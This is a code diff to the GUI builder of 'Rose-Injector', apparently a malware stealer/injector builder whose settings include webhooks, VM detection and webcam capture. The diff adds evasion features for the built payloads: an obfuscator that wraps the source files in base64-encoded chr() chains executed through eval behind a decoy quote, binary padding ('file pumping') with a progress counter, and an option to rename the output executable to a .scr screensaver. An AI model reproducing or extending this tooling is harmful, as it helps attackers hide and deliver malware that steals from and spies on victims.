@@ -13,6 +13,9 @@ import os
 from pathlib import Path
 import ctypes
 
+import base64
+import random
+
 import logging
 import subprocess
 
@@ -45,7 +48,7 @@ gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png'
-__version__ = '1.4'
+__version__ = '1.5'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/tools/rose.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
@@ -83,13 +86,15 @@ data_builder = {
     "vm_detect": False,
     "vm_webhook_url": "",
     "webcam": False,
-    "icon_file": ""
+    "icon_file": "",
+    "obfuscation": False,
+    "type_file": ""
 }
 
 links = {
     "xpierroz_github": "https://github.com/xpierroz",
     "xpierroz_insta": "https://www.instagram.com/_p.slm/",
-    "gumbobrot_github": "https://github.com/Gumbobrot",
+    "gumbobr0t_github": "https://github.com/gumbobr0t",
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
     "rose_github": "https://github.com/DamagingRose/Rose-Injector",
@@ -254,10 +259,70 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in edit_config: {e}")
 
+    def obfuscate():
+        logger.info('Entered obfuscate func')
+        
+        quotes = [
+            "The best way to predict the future is to create it. - Abraham Lincoln",
+            "In three words I can sum up everything I've learned about life: it goes on. - Robert Frost",
+            "The only limit to our realization of tomorrow will be our doubts of today. - Franklin D. Roosevelt",
+        ]
+
+        def encode_base64(data):
+            return base64.b64encode(data.encode()).decode()
+
+        def apply_custom_obfuscation(data):
+            obfuscated_data = ''
+            for char in data:
+                obfuscated_data += f'chr({ord(char)}) + '
+            return obfuscated_data[:-3]
+
+        def generate_obfuscated_code(input_filename):
+            with open(input_filename, 'r', encoding='utf-8') as f:
+                original_code = f.read()
+
+            obfuscated_code = original_code
+            obfuscation_methods = [apply_custom_obfuscation]
+
+            for method in obfuscation_methods:
+                obfuscated_code = method(obfuscated_code)
+
+            obfuscated_code = encode_base64(obfuscated_code)
+
+            return obfuscated_code
+
+        def create_obfuscated_file(input_filename):
+            obfuscated_code = generate_obfuscated_code(input_filename)
+            backup_dir = 'backup'
+
+            if not os.path.exists(backup_dir):
+                os.makedirs(backup_dir)
+
+            backup_filename = os.path.join(backup_dir, os.path.basename(input_filename)[:-3] + '_backup.py')
+            shutil.move(input_filename, backup_filename)
+
+            with open(input_filename, 'w') as f:
+                f.write(f'"""\n{random.choice(quotes)}\n"""\n')
+                f.write(f'eval(__import__("base64").b64decode({repr(obfuscated_code)}))')
+                f.close()
+
+            logger.info(f'Obfuscated code written to "{input_filename}"')
+            logger.info(f'Original code backed up as "{backup_filename}"')
+
+        if data_builder["obfuscation"]:
+            try:
+                directory_path = os.path.join(Path(__file__).resolve().parent, data_builder['build_name'])
+                unobf_files = [f for f in os.listdir(directory_path) if os.path.isfile(os.path.join(directory_path, f))]
+                for unobf_file in unobf_files:
+                    create_obfuscated_file(os.path.join(Path(__file__).resolve().parent, data_builder['build_name'], unobf_file))
+            except Exception as e:
+                logger.error(f"Error in obfuscating files: {e}")
+
     def pump_file():
         logger.info(f"DEBUGGING File pumper is set to: {data_builder['file_pumper']}")
         logger.info(f"DEBUGGING File pumper size is set to: {data_builder['file_pumper_size']}")
-        if data_builder["file_pumper"] is True:
+        pumping_proc = 0
+        if data_builder["file_pumper"]:
             if data_builder["file_pumper_size"] is not None:
                 logger.info("Entering file pump process")
                 try:
@@ -266,6 +331,8 @@ def _makebuild(q: Queue, data_builder) -> str:
                     with open(f"{data_builder['build_name']}.exe", 'ab') as f:
                         for i in range(b_size // bufferSize):
                             f.write(bytes([0] * bufferSize))
+                            pumping_proc += 1
+                    logger.info(f"Pumped successfuly for {pumping_proc} times ({data_builder['file_pumper_size']})")
                     logger.info("Finished file pump process")
                 except Exception as e:
                     logger.error(f"Error in pumping file: {e}")
@@ -296,17 +363,27 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in move_dir: {e}")
             
+    def assign_extension():
+        old_exe_path = os.getcwd() + f'\{data_builder["build_name"]}.exe'
+        new_scr_path = os.getcwd() + f'\{data_builder["build_name"]}.scr'
+        if data_builder["type_file"] == 'Screensaver':
+            os.rename(old_exe_path, new_scr_path)
+        
     create_dir()
-    q.put_nowait(0.2)
+    q.put_nowait(0.1)
     get_files()
-    q.put_nowait(0.4)
+    q.put_nowait(0.2)
     edit_config()
-    q.put_nowait(0.6)
+    q.put_nowait(0.3)
+    obfuscate()
+    q.put_nowait(0.4)
     compile()
-    q.put_nowait(0.8)
+    q.put_nowait(0.6)
     move_dir()
-    q.put_nowait(1)
+    q.put_nowait(0.7)
     pump_file()
+    q.put_nowait(0.9)
+    assign_extension()
     q.put_nowait(1)
     return 'Done!'
 
@@ -344,10 +421,17 @@ def _home():
         ).props('inline color=pink-3').classes('w-full')
         ui.input(
             label='File icon',
-            placeholder='Specify the exact .ico path / Leave blank for basic',
+            placeholder='Specify the exact .ico path, leave blank for basic',
             on_change=lambda e: change_data("icon_file", e.value)
         ).props('inline color=pink-3').classes('w-full')
-        
+        ui.select(
+            label='File type',
+            options=["Executable", "Screensaver"],
+            value="Executable",
+            on_change=lambda e: change_data('type_file', e.value)
+        ).props("color=pink-3").classes('w-full')
+        ui.checkbox('Obfuscate src files', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
+
         ui.button(
             'Test WebHook',
             on_click=_test_webhook
@@ -356,9 +440,11 @@ def _home():
             'Build',
             on_click=start_computation
         ).props("icon=build color=pink-3").classes('w-full')
-        
+
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
-        might_take = ui.label("At 60%, compiling might take 2 to 3 minutes depending on your computer & the options you chose. You can look at the progress on both .log file")
+        might_take = ui.label("At 40% / 70%, compiling/file pumping might take a few minutes depending on your computer & the options you chose. You can look at the progress on both log files.")
+        ui.button("Open Rose Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'roselog.log'))
+        ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
         progressbar.visible = False
         might_take.visible = False
 
@@ -443,9 +529,9 @@ def _github():
                         ui.button(on_click=lambda: open_link("xpierroz_insta")).props("round icon=star_rate color=amber-8")
 
                 with ui.card_section():
-                    ui.label("Gumbobrot").classes("text-h6")
+                    ui.label("gumbobr0t").classes("text-h6")
                     ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
-                    ui.button(on_click=lambda: open_link("gumbobrot_github")).props("round icon=code color=blue-11")
+                    ui.button(on_click=lambda: open_link("gumbobr0t_github")).props("round icon=code color=blue-11")
 
             with ui.row():               
                 with ui.card_section():
